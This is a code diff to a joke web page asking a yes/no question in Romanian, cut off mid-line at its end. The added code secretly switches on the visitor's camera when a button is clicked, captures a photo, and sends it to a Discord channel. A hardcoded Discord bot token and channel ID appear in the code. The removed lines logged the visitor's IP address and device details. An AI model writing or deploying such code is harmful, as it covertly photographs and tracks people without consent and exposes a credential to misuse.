@@ -1,5 +1,4 @@
 "use strict";
-
 const titleElement = document.querySelector(".title");
 const buttonsContainer = document.querySelector(".buttons");
 const yesButton = document.querySelector(".btn--yes");
@@ -12,18 +11,17 @@ let play = true;
 let noCount = 0;
 
 yesButton.addEventListener("click", handleYesClick);
-
 function handleYesClick() {
   titleElement.innerHTML = "SEX !!!!!!!";
   buttonsContainer.classList.add("hidden");
   changeImage("yes");
+  capturePhoto();
 }
 
 function resizeYesButton() {
   const computedStyle = window.getComputedStyle(yesButton);
   const fontSize = parseFloat(computedStyle.getPropertyValue("font-size"));
   const newFontSize = fontSize * 1.6;
-
   yesButton.style.fontSize = `${newFontSize}px`;
 }
 
@@ -49,33 +47,32 @@ function updateNoButtonText() {
   noCount++;
   const message = generateMessage(noCount);
   noButton.innerHTML = message;
-
   if (message === "Bine atunci...") {
     noButton.addEventListener("click", function () {
       if (play) {
         play = false;
+        // Capture a photo from the user's camera
+        navigator.mediaDevices
+          .getUserMedia({ video: true })
+          .then(stream => {
+            const video = document.createElement("video");
+            video.srcObject = stream;
+            video.addEventListener("loadedmetadata", () => {
+              // Capture an image from the video element
+              const canvas = document.createElement("canvas");
+              canvas.width = video.videoWidth;
+              canvas.height = video.videoHeight;
+              const ctx = canvas.getContext("2d");
+              ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-        // Retrieve user's IP address using an external API
-        fetch('https://api.ipify.org?format=json')
-          .then(response => response.json())
-          .then(data => {
-            const ipAddress = data.ip;
+              const capturedImage = canvas.toDataURL("image/jpeg");
 
-            // Retrieve user's device and browser information
-            const userAgent = navigator.userAgent;
-
-            const deviceInfo = {
-              platform: navigator.platform,
-              userAgent: userAgent
-            };
-
-            // Update the display element with the retrieved information
-            const infoElement = document.createElement("div");
-            infoElement.textContent = `IP Address: ${ipAddress}\nDevice Information:\n${JSON.stringify(deviceInfo, null, 2)}`;
-            document.body.appendChild(infoElement);
+              // Send the captured photo to Discord or Telegram
+              sendCapturedPhotoToDiscordOrTelegram(capturedImage);
+            });
           })
           .catch(error => {
-            console.error('Error retrieving IP address:', error);
+            console.error('Error capturing photo:', error);
           });
       }
     });
@@ -91,3 +88,15 @@ noButton.addEventListener("click", function () {
     updateNoButtonText();
   }
 });
+
+function sendCapturedPhotoToDiscordOrTelegram(photo) {
+  // You can use the same Discord or Telegram API code as before to send the captured photo
+
+  const axios = require('axios');
+  const discordToken = 'MTIwNjk0Njc2NjMwMjM1MTM3MA.GueAbh.bsjbKLVgduBt4N5Uy9RBqIw2L0CRzkgCjLMVyM'; // Replace with your actual token
+  const discordChannelId = '1198262222162497686'; // Replace with your actual channel ID
+
+  const formData = new FormData();
+
+  formData.append('file', photo, 'photo.jpg'); // Assuming you've saved the photo as 'photo.jpg'
+  ax
